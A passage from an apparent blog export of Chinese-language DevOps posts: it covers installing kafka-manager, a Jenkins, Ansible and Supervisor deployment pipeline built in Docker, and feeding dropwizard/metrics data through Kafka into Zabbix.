<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="http://stackoverflow.com/questions/736513/how-do-i-parse-a-url-into-hostname-and-path-in-javascript" target="_blank" rel="noopener">http://stackoverflow.com/questions/736513/how-do-i-parse-a-url-into-hostname-and-path-in-javascript</a></p>
<p><a href="http://stackoverflow.com/questions/5522097/prevent-iframe-stealing" target="_blank" rel="noopener">http://stackoverflow.com/questions/5522097/prevent-iframe-stealing</a></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>iframe</tag>
        <tag>html</tag>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>kafka manager安装</title>
    <url>/kafka-manager-install/</url>
    <content><![CDATA[<h2 id="项目信息"><a href="#项目信息" class="headerlink" title="项目信息"></a>项目信息</h2><p><a href="https://github.com/yahoo/kafka-manager" target="_blank" rel="noopener">https://github.com/yahoo/kafka-manager</a></p>
<p>这个项目比  <a href="https://github.com/claudemamo/kafka-web-console" target="_blank" rel="noopener">https://github.com/claudemamo/kafka-web-console</a> 要好用一些，显示的信息更加丰富，kafka-manager本身可以是一个集群。</p>
<p>不过kafka-manager也没有权限管理功能。</p>
<p>Kafka web console的安装可以参考之前的blog：</p>
<p><a href="http://blog.csdn.net/hengyunabc/article/details/40431627" target="_blank" rel="noopener">http://blog.csdn.net/hengyunabc/article/details/40431627</a></p>
<h2 id="安装sbt"><a href="#安装sbt" class="headerlink" title="安装sbt"></a>安装sbt</h2><p>sbt是scala的打包构建工具。</p>
<p><a href="http://www.scala-sbt.org/download.html" target="_blank" rel="noopener">http://www.scala-sbt.org/download.html</a></p>
<p>ubuntu下安装：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">"deb https://dl.bintray.com/sbt/debian /"</span> | sudo tee -a /etc/apt/sources.list.d/sbt.list</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install sbt</span><br></pre></td></tr></table></figure></p>
<h2 id="下载，编绎"><a href="#下载，编绎" class="headerlink" title="下载，编绎"></a>下载，编绎</h2><p>编绎，生成发布包：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/yahoo/kafka-manager</span><br><span class="line"><span class="built_in">cd</span> kafka-manager</span><br><span class="line">sbt clean dist</span><br></pre></td></tr></table></figure>
<p>生成的包会在kafka-manager/target/universal 下面。生成的包只需要java环境就可以运行了，在部署的机器上不需要安装sbt。</p>
<p>如果打包很慢的话，可以考虑配置代理。</p>
<h2 id="部署"><a href="#部署" class="headerlink" title="部署"></a>部署</h2><p>打好包好，在部署机器上解压，修改好配置文件，就可以运行了。</p>
<ul>
<li>解压</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">unzip kafka-manager-1.0-SNAPSHOT.zip</span><br></pre></td></tr></table></figure>
<ul>
<li>修改conf/application.conf，把kafka-manager.zkhosts改为自己的zookeeper服务器地址</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kafka-manager.zkhosts=&quot;localhost:2181&quot;</span><br></pre></td></tr></table></figure>
<ul>
<li>启动</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> kafka-manager-1.0-SNAPSHOT/bin</span><br><span class="line">./kafka-manager -Dconfig.file=../conf/application.conf</span><br></pre></td></tr></table></figure>
<p>查看帮助 和 后台运行：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./kafka-manager -h</span><br><span class="line">nohup ./kafka-manager -Dconfig.file=../conf/application.conf &gt;/dev/null 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure></p>
<p>默认http端口是9000，可以修改配置文件里的http.port的值，或者通过命令行参数传递：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./kafka-manager -Dhttp.port=9001</span><br></pre></td></tr></table></figure></p>
<p>正常来说，play框架应该会自动加载conf/application.conf配置里的内容，但是貌似这个不起作用，要显式指定才行。</p>
<p>参考： <a href="https://github.com/yahoo/kafka-manager/issues/16" target="_blank" rel="noopener">https://github.com/yahoo/kafka-manager/issues/16</a></p>
<h2 id="sbt-配置代理"><a href="#sbt-配置代理" class="headerlink" title="sbt 配置代理"></a>sbt 配置代理</h2><p>sbt的配置http代理的参考文档：</p>
<p><a href="http://www.scala-sbt.org/0.12.1/docs/Detailed-Topics/Setup-Notes.html#http-proxy" target="_blank" rel="noopener">http://www.scala-sbt.org/0.12.1/docs/Detailed-Topics/Setup-Notes.html#http-proxy</a></p>
<p>通过-D设置叁数即可：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -Dhttp.proxyHost=myproxy -Dhttp.proxyPort=8080 -Dhttp.proxyUser=username -Dhttp.proxyPassword=mypassword</span><br></pre></td></tr></table></figure></p>
<p>也可以用下面这种方式，设置一下SBT_OPTS的环境变量即可：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> SBT_OPTS=<span class="string">"<span class="variable">$SBT_OPTS</span> -Dhttp.proxyHost=myproxy -Dhttp.proxyPort=myport"</span></span><br></pre></td></tr></table></figure></p>
<p>要注意的是，myproxy，这个值里不要带http前缀，也不要带端口号。</p>
<p>比如，你的代理是<a href="http://localhost:8123，那么应该这样配置：" target="_blank" rel="noopener">http://localhost:8123，那么应该这样配置：</a><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> SBT_OPTS=<span class="string">"<span class="variable">$SBT_OPTS</span> -Dhttp.proxyHost=localhost -Dhttp.proxyPort=8123"</span></span><br></pre></td></tr></table></figure></p>
<h2 id="打好的一个包"><a href="#打好的一个包" class="headerlink" title="打好的一个包"></a>打好的一个包</h2><p>如果打包有问题的小伙伴可以从这里下载：</p>
<p><a href="http://pan.baidu.com/s/1kTtFpGV" target="_blank" rel="noopener">http://pan.baidu.com/s/1kTtFpGV</a></p>
<p>md5： bde4f57c4a1ac09a0dc7f3f892ea9026</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>kafka</tag>
      </tags>
  </entry>
  <entry>
    <title>一步一步用jenkins，ansible，supervisor打造一个web构建发布系统</title>
    <url>/deploy-system-jenkins-ansible-supervisor/</url>
    <content><![CDATA[<p>一步一步用jenkins，ansible，supervisor打造一个web构建发布系统。</p>
<p>本来应该还有gitlab这一环节的，但是感觉加上，内容会增加很多。所以直接用github上的spring-mvc-showcase项目来做演示。</p>
<p><a href="https://github.com/spring-projects/spring-mvc-showcase" target="_blank" rel="noopener">https://github.com/spring-projects/spring-mvc-showcase</a></p>
<p>本文的环境用docker来构建。当然也可以任意linux环境下搭建。</p>
<p>如果没有安装docker，可以参考官方的文档：<br><a href="https://docs.docker.com/installation/ubuntulinux/#ubuntu-trusty-1404-lts-64-bit" target="_blank" rel="noopener">https://docs.docker.com/installation/ubuntulinux/#ubuntu-trusty-1404-lts-64-bit</a> </p>
<p>下面将要介绍的完整流程是：</p>
<ul>
<li>github作为源代码仓库</li>
<li>jenkins做为打包服务器，Web控制服务器</li>
<li>ansible把war包，发布到远程机器<ol>
<li>安装python-pip</li>
<li>用pip安装supervisor</li>
<li>安装jdk</li>
<li>下载，部署tomcat</li>
<li>把tomcat交由supervisor托管</li>
<li>把jenkins生成的war包发布到远程服务器上</li>
<li>supervisor启动tomcat</li>
<li>在http端口等待tomcat启动成功</li>
</ol>
</li>
<li>supervisor托管app进程，提供一个web界面可以查看进程状态，日志，控制重启等。</li>
</ul>
<p>在文章的最后，会给出一个完整的docker镜像，大家可以自己运行查看实际效果。</p>
<h2 id="安装jenkins"><a href="#安装jenkins" class="headerlink" title="安装jenkins"></a>安装jenkins</h2><ul>
<li>先用docker来启动一个名为“jenkins”的容器：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo docker run -i -t -p 8080:8080 -p 8101:8101 -p 9001:9001 --name=<span class="string">'jenkins'</span> ubuntu /bin/bash</span><br></pre></td></tr></table></figure>
<p>8080是jenkins的端口，8101是spring-mvc-showcase的端口，9001是supervisor的web界面端口</p>
<p>执行完之后，会得到一个container的shell。接着在这个shell里安装其它组件。</p>
<ul>
<li>安装open jdk 和 git：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install openjdk-7-jdk git</span><br></pre></td></tr></table></figure>
<ul>
<li>下载配置tomcat：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt-get install wget</span><br><span class="line">mkdir /opt/jenkins</span><br><span class="line">cd /opt/jenkins</span><br><span class="line">wget http://apache.fayea.com/tomcat/tomcat-8/v8.0.18/bin/apache-tomcat-8.0.18.tar.gz</span><br><span class="line">tar xzf apache-tomcat-8.0.18.tar.gz</span><br></pre></td></tr></table></figure>
<ul>
<li>安装jenkins：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt/jenkins/apache-tomcat-8.0.18/webapps</span><br><span class="line">wget http://mirrors.jenkins-ci.org/war/latest/jenkins.war</span><br><span class="line">rm -rf ROOT*</span><br><span class="line">mv jenkins.war ROOT.war</span><br></pre></td></tr></table></figure>
<ul>
<li>启动jenkins：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/opt/jenkins/apache-tomcat-8.0.18/bin/startup.sh</span><br></pre></td></tr></table></figure>
<p>然后在本机用浏览器访问：<a href="http://localhost:8080/" target="_blank" rel="noopener">http://localhost:8080/</a> ，可以看到jenkins的界面了。</p>
<h2 id="配置jenkins"><a href="#配置jenkins" class="headerlink" title="配置jenkins"></a>配置jenkins</h2><h3 id="安装git插件"><a href="#安装git插件" class="headerlink" title="安装git插件"></a>安装git插件</h3><p>安装git插件：<br><a href="https://wiki.jenkins-ci.org/display/JENKINS/Git+Plugin" target="_blank" rel="noopener">https://wiki.jenkins-ci.org/display/JENKINS/Git+Plugin</a></p>
<p>在“系统管理”，“插件管理”，“可选插件”列表里，搜索“Git Plugin”，这样比较快可以找到。</p>
<p>因为jenkins用google来检查网络的连通性，所以可能在开始安装插件时会卡住一段时间。</p>
<h3 id="配置maven-java"><a href="#配置maven-java" class="headerlink" title="配置maven, java"></a>配置maven, java</h3><p>打开 <a href="http://localhost:8080/configure，" target="_blank" rel="noopener">http://localhost:8080/configure，</a><br>在jenkins的系统配置里，可以找到maven，git，java相关的配置，只要勾选了，在开时执行job时，会自动下载。<br><img src="/img/jenkins-config-maven.png" alt="jenkins-config-maven"></p>
<p>JDK可以选择刚才安装好的openjdk，也可以选择自动安装oracle jdk。<br><img src="/img/jenkins-config-openjdk7.png" alt="jenkins-config-openjdk7"></p>
<p>Git会自动配置好。</p>
<h2 id="配置ssh服务"><a href="#配置ssh服务" class="headerlink" title="配置ssh服务"></a>配置ssh服务</h2><p>安装sshd服务：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install openssh-server sshpass</span><br></pre></td></tr></table></figure></p>
<p>编辑<br>vi /etc/ssh/sshd_config<br>把<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PermitRootLogin without-password</span><br></pre></td></tr></table></figure></p>
<p>改为：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PermitRootLogin yes</span><br></pre></td></tr></table></figure></p>
<p>重启ssh服务：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /etc/init.d/ssh restart</span><br></pre></td></tr></table></figure></p>
<p>为root用户配置密码，设置为12345：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">passwd</span><br></pre></td></tr></table></figure></p>
<p>最后尝试登陆下：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh root@127.0.0.1</span><br></pre></td></tr></table></figure></p>
<h2 id="安装ansible"><a href="#安装ansible" class="headerlink" title="安装ansible"></a>安装ansible</h2><p>在jenkins这个container里，继续安装ansible，用来做远程发布用。</p>
<p>先安装pip，再用pip安装ansible：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install python-pip python-dev build-essential git</span><br><span class="line">sudo pip install ansible</span><br></pre></td></tr></table></figure></p>
<h2 id="配置ansible-playbook"><a href="#配置ansible-playbook" class="headerlink" title="配置ansible playbook"></a>配置ansible playbook</h2><p>把自动发布的ansible playbook clone到本地：</p>
<p><a href="https://github.com/hengyunabc/jenkins-ansible-supervisor-deploy" target="_blank" rel="noopener">https://github.com/hengyunabc/jenkins-ansible-supervisor-deploy</a><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir -p /opt/ansible</span><br><span class="line"><span class="built_in">cd</span> /opt/ansible</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/hengyunabc/jenkins-ansible-supervisor-deploy</span><br></pre></td></tr></table></figure></p>
<h2 id="在jenkins上建立deploy-job"><a href="#在jenkins上建立deploy-job" class="headerlink" title="在jenkins上建立deploy job"></a>在jenkins上建立deploy job</h2><ul>
<li>新建一个maven的项目/job，名为spring-mvc-showcase<br><img src="/img/jenkins-new-job-maven.png" alt="jenkins-new-job-maven"></li>
</ul>
<ul>
<li>在配置页面里，勾选“参数化构建过程”，再依次增加“String”类型的参数</li>
</ul>
<p><img src="/img/jenkins-new-job-parameters.png" alt="jenkins-new-job-parameters"></p>
<p>共有这些参数：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">app	   要发布的app的名字</span><br><span class="line">	http_port	  tomcat的http端口</span><br><span class="line">	https_port	tomcat的https端口</span><br><span class="line">	server_port	tomcat的server port</span><br><span class="line">	JAVA_OPTS	 tomcat启动的Java参数</span><br><span class="line">	deploy_path	  tomcat的目录</span><br><span class="line">	target_host	 要发布到哪台机器</span><br><span class="line">	war_path	   jenkins生成的war包的目录</span><br></pre></td></tr></table></figure></p>
<ul>
<li>“源码管理”，选择Git，再填入代码地址</li>
</ul>
<p><a href="https://github.com/spring-projects/spring-mvc-showcase.git" target="_blank" rel="noopener">https://github.com/spring-projects/spring-mvc-showcase.git</a></p>
<p><img src="/img/jenkins-new-job-git.png" alt="jenkins-new-job-git"></p>
<ul>
<li>在“Post Steps”里，增加调用ansible playbook的shell命令<br><img src="/img/jenkins-new-job-shell-ansible.png" alt="jenkins-new-job-shell-ansible"></li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /opt/ansible/jenkins-ansible-supervisor-deploy</span><br><span class="line">ansible-playbook -i hosts site.yml --verbose --extra-vars <span class="string">"target_host=<span class="variable">$target_host</span> app=<span class="variable">$app</span> http_port=<span class="variable">$http_port</span> https_port=<span class="variable">$https_port</span> server_port=<span class="variable">$server_port</span> deploy_path=<span class="variable">$deploy_path</span> JAVA_HOME=/usr JAVA_OPTS=<span class="variable">$JAVA_OPTS</span> deploy_war_path=<span class="variable">$WORKSPACE</span>/<span class="variable">$war_path</span>"</span></span><br></pre></td></tr></table></figure>
<p>最后，保存。</p>
<h2 id="测试构建"><a href="#测试构建" class="headerlink" title="测试构建"></a>测试构建</h2><p>一切都配置好之后，可以在jenkins界面上，在左边，选择“Build with Parameters”，“开始”来构建项目了。</p>
<p>如果构建成功的话，就可以打开 <a href="http://localhost:8101" target="_blank" rel="noopener">http://localhost:8101</a> ，就可以看到spring-mvc-showcase的界面了。</p>
<p><img src="/img/spring-mvc-showcase-webui.png" alt="spring-mvc-showcase-webui"></p>
<p>打开 <a href="http://localhost:9001" target="_blank" rel="noopener">http://localhost:9001</a> 可以看到superviosr的控制网页，可以查看tomcat进程的状态，重启，查看日志等。</p>
<p><img src="/img/supervisor-webui.png" alt="supervisor-webui"></p>
<p>如果想要发布到其它机器上的话，只要在</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">  /opt/ansible/jenkins-ansible-supervisor-deploy/hosts </span><br><span class="line">  ``` </span><br><span class="line">  </span><br><span class="line">文件里增加相应的host配置就可以了。</span><br><span class="line"></span><br><span class="line">## 其它的一些东东</span><br><span class="line">如果提示</span><br></pre></td></tr></table></figure>
<p>to use the ‘ssh’ connection type with passwords, you must install the sshpass program<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">则安装：</span><br><span class="line">```bash</span><br><span class="line">sudo apt-get install sshpass</span><br></pre></td></tr></table></figure></p>
<h2 id="演示的docker-image"><a href="#演示的docker-image" class="headerlink" title="演示的docker image"></a>演示的docker image</h2><p>如果只是想查看实际运行效果，可以直接把 hengyunabc/jenkins-ansible-supervisor 这个image拉下来，运行即可。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it -p 8080:8080 -p 8101:8101 -p 9001:9001 --name=<span class="string">'jenkins'</span> hengyunabc/jenkins-ansible-supervisor</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>jenkins提供了丰富的插件，可以定制自己的打包这过程，并可以提供完善的权限控制</li>
<li>ansible可以轻松实现远程部署，配置环境等工作，轻量简洁，功能强大</li>
<li>supervisor托管了tomcat进程，提供了web控制界面，所有运行的程序一目了然，很好用</li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>jenkins</tag>
        <tag>ansible</tag>
        <tag>supervisor</tag>
        <tag>docker</tag>
        <tag>devops</tag>
        <tag>运维</tag>
      </tags>
  </entry>
  <entry>
    <title>基于dropwizard/metrics ，kafka，zabbix构建应用统计数据收集展示系统</title>
    <url>/about-metrics/</url>
    <content><![CDATA[<h2 id="想要实现的功能"><a href="#想要实现的功能" class="headerlink" title="想要实现的功能"></a>想要实现的功能</h2><ul>
<li>应用可以用少量的代码，实现统计某类数据的功能</li>
<li>统计的数据可以很方便地展示</li>
</ul>
<h2 id="metrics"><a href="#metrics" class="headerlink" title="metrics"></a>metrics</h2><p>metrics，按字面意思是度量，指标。</p>
<p>举具体的例子来说，一个web服务器：</p>
<ul>
<li>一分钟内请求多少次？</li>
<li>平均请求耗时多长？</li>
<li>最长请求时间？</li>
<li>某个方法的被调用次数，时长？</li>
</ul>
<p>以缓存为例：</p>
<ul>
<li>平均查询缓存时间？</li>
<li>缓存获取不命中的次数/比例？</li>
</ul>
<p>以jvm为例：</p>
<ul>
<li>GC的次数？</li>
<li>Old Space的大小？</li>
</ul>
<p>在一个应用里，需要收集的metrics数据是多种多样的，需求也是各不同的。需要一个统一的metrics收集，统计，展示平台。</p>
<h2 id="流行的metrics的库"><a href="#流行的metrics的库" class="headerlink" title="流行的metrics的库"></a>流行的metrics的库</h2><p><a href="https://github.com/dropwizard/metrics" target="_blank" rel="noopener">https://github.com/dropwizard/metrics</a><br>java实现，很多开源项目用到，比如hadoop，kafka。下面称为dropwizard/metrics。</p>
<p><a href="https://github.com/tumblr/colossus" target="_blank" rel="noopener">https://github.com/tumblr/colossus</a><br>scala实现，把数据存到OpenTsdb上。</p>
<p>spring boot 项目里的metrics：</p>
<p><a href="http://docs.spring.io/spring-boot/docs/current/reference/html/production-ready-metrics.html" target="_blank" rel="noopener">http://docs.spring.io/spring-boot/docs/current/reference/html/production-ready-metrics.html</a></p>
<p>spring boot里的metrics很多都是参考dropwizard/metrics的。</p>
<h2 id="metrics的种类"><a href="#metrics的种类" class="headerlink" title="metrics的种类"></a>metrics的种类</h2><p>dropwizard/metrics 里主要把metrics分为下面几大类：</p>
<p><a href="https://dropwizard.github.io/metrics/3.1.0/getting-started/" target="_blank" rel="noopener">https://dropwizard.github.io/metrics/3.1.0/getting-started/</a></p>
<h3 id="Gauges"><a href="#Gauges" class="headerlink" title="Gauges"></a>Gauges</h3><p>gauge用于测量一个数值。比如队列的长度：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">QueueManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Queue queue;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">QueueManager</span><span class="params">(MetricRegistry metrics, String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.queue = <span class="keyword">new</span> Queue();</span><br><span class="line">        metrics.register(MetricRegistry.name(QueueManager.class, name, "size"),</span><br><span class="line">                         <span class="keyword">new</span> Gauge&lt;Integer&gt;() &#123;</span><br><span class="line">                             <span class="meta">@Override</span></span><br><span class="line">                             <span class="function"><span class="keyword">public</span> Integer <span class="title">getValue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                                 <span class="keyword">return</span> queue.size();</span><br><span class="line">                             &#125;</span><br><span class="line">                         &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="Counters"><a href="#Counters" class="headerlink" title="Counters"></a>Counters</h3><p>counter是AtomicLong类型的gauge。比如可以统计阻塞在队列里的job的数量：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">private final Counter pendingJobs = metrics.counter(name(QueueManager.class, "pending-jobs"));</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addJob</span><span class="params">(Job job)</span> </span>&#123;</span><br><span class="line">    pendingJobs.inc();</span><br><span class="line">    queue.offer(job);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> Job <span class="title">takeJob</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    pendingJobs.dec();</span><br><span class="line">    <span class="keyword">return</span> queue.take();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="Histograms"><a href="#Histograms" class="headerlink" title="Histograms"></a>Histograms</h3><p>histogram统计数据的分布。比如最小值，最大值，中间值，还有中位数，75百分位, 90百分位, 95百分位, 98百分位, 99百分位, and 99.9百分位的值(percentiles)。</p>
<p>比如request的大小的分布：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">private final Histogram responseSizes = metrics.histogram(name(RequestHandler.class, "response-sizes"));</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleRequest</span><span class="params">(Request request, Response response)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// etc</span></span><br><span class="line">    responseSizes.update(response.getContent().length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="Timers"><a href="#Timers" class="headerlink" title="Timers"></a>Timers</h3><p>timer正如其名，统计的是某部分代码/调用的运行时间。比如统计response的耗时：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">private final Timer responses = metrics.timer(name(RequestHandler.class, "responses"));</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">handleRequest</span><span class="params">(Request request, Response response)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> Timer.Context context = responses.time();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// etc;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">"OK"</span>;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        context.stop();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="Health-Checks"><a href="#Health-Checks" class="headerlink" title="Health Checks"></a>Health Checks</h3><p>这个实际上不是统计数据。是接口让用户可以自己判断系统的健康状态。如判断数据库是否连接正常：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> HealthCheckRegistry healthChecks = <span class="keyword">new</span> HealthCheckRegistry();</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DatabaseHealthCheck</span> <span class="keyword">extends</span> <span class="title">HealthCheck</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Database database;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">DatabaseHealthCheck</span><span class="params">(Database database)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.database = database;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> HealthCheck.<span class="function">Result <span class="title">check</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (database.isConnected()) &#123;</span><br><span class="line">            <span class="keyword">return</span> HealthCheck.Result.healthy();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> HealthCheck.Result.unhealthy(<span class="string">"Cannot connect to "</span> + database.getUrl());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="Metrics-Annotation"><a href="#Metrics-Annotation" class="headerlink" title="Metrics Annotation"></a>Metrics Annotation</h3><p>利用dropwizard/metrics 里的annotation，可以很简单的实现统计某个方法，某个值的数据。<br>如：<br><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 统计调用的次数和时间</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Timed</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">call</span><span class="params">()</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 统计登陆的次数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Counted</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">userLogin</span><span class="params">()</span></span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>想要详细了解各种metrics的实际效果，简单的运行下测试代码，用ConsoleReporter输出就可以知道了。</p>
<h2 id="metrics数据的传输和展示"><a href="#metrics数据的传输和展示" class="headerlink" title="metrics数据的传输和展示"></a>metrics数据的传输和展示</h2><p>dropwizard/metrics 里提供了reporter的接口，用户可以自己实现如何处理metrics数据。</p>
<p>dropwizard/metrics有不少现成的reporter：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ConsoleReporter  输出到stdout</span><br><span class="line">JmxReporter  转化为MBean</span><br><span class="line">metrics-servlets  提供http接口，可以查询到metrics信息</span><br><span class="line">CsvReporter 输出为CSV文件</span><br><span class="line">Slf4jReporter 以log方式输出</span><br><span class="line">GangliaReporter  上报到Ganglia</span><br><span class="line">GraphiteReporter 上报到Graphite</span><br></pre></td></tr></table></figure></p>
<p>上面的各种reporter中，Ganglia开源多年，但缺少一些监控的功能，图形展示也很简陋。Graphite已经停止开发了。</p>
<p>而公司所用的监控系统是zabbix，而dropwizard/metrics没有现成的zabbix reporter。</p>
<h2 id="zabbix的限制"><a href="#zabbix的限制" class="headerlink" title="zabbix的限制"></a>zabbix的限制</h2><p>zabbix上报数据通常用zabbix agent或者zabbix trapper。<br>用户自己上报的数据通常用zabbix trapper来上报。</p>
<p>zabbix上收集数据的叫item，每个item都有自己的key，而这些item不会自动创建。zabbix有Low-level discovery，可以自动创建item，但是也相当麻烦，而且key的命名非常奇怪。不如直接用template了。</p>
<p><a href="https://www.zabbix.com/documentation/2.4/manual/discovery/low_level_discovery" target="_blank" rel="noopener">https://www.zabbix.com/documentation/2.4/manual/discovery/low_level_discovery</a></p>
<p>假定zabbix上不同的应用的key都是相对固定的，那么就可以通过模板的方式，比较方便地统一创建item, graph了。</p>
<p>另外想要实现自动创建item，比较好的办法是通过zabbix api了。</p>
<p>但目前Java版没有实现，于是实现了一个简单的：</p>
<p><a href="https://github.com/hengyunabc/zabbix-api" target="_blank" rel="noopener">https://github.com/hengyunabc/zabbix-api</a></p>
<h2 id="dropwizard-metrics-zabbix-reporter"><a href="#dropwizard-metrics-zabbix-reporter" class="headerlink" title="dropwizard/metrics zabbix reporter"></a>dropwizard/metrics zabbix reporter</h2><p>基于上面的template的思路，实现了一个dropwizard/metrics 的zabbix reporter。</p>
<p>原理是，通过zabbix sender，把metrics数据直接发送到zabbix server上。</p>
<p><a href="https://github.com/hengyunabc/zabbix-sender" target="_blank" rel="noopener">https://github.com/hengyunabc/zabbix-sender</a></p>
<p><a href="https://github.com/hengyunabc/metrics-zabbix" target="_blank" rel="noopener">https://github.com/hengyunabc/metrics-zabbix</a></p>
<h2 id="dropwizard-metrics发送到kafka，再从kafka发到zabbix"><a href="#dropwizard-metrics发送到kafka，再从kafka发到zabbix" class="headerlink" title="dropwizard/metrics发送到kafka，再从kafka发到zabbix"></a>dropwizard/metrics发送到kafka，再从kafka发到zabbix</h2><p>上面的方案感觉还是不太理想：</p>
<ul>
<li>没有实现自动化，还要手动为每一个应用配置template，不够灵活</li>
<li>所有的数据都发送到一个zabbix server上，担心性能有瓶颈<br>于是，新的思路是，把metrics数据发送到kafka上，然后再从kafka上消费，再把数据传到zabbix server上。</li>
</ul>
<p>这样的好处是：</p>
<ul>
<li>kafka可以灵活扩容，不会有性能瓶颈</li>
<li>从kafka上消费metrics数据，<strong>可以灵活地用zabbix api来创建item, graph</strong></li>
</ul>
<p>于是实现了两个新项目：</p>
<ul>
<li><a href="https://github.com/hengyunabc/metrics-kafka" target="_blank" rel="noopener">https://github.com/hengyunabc/metrics-kafka</a></li>
<li><a href="https://github.com/hengyunabc/kafka-zabbix" target="_blank" rel="noopener">https://github.com/hengyunabc/kafka-zabbix</a></li>
</ul>
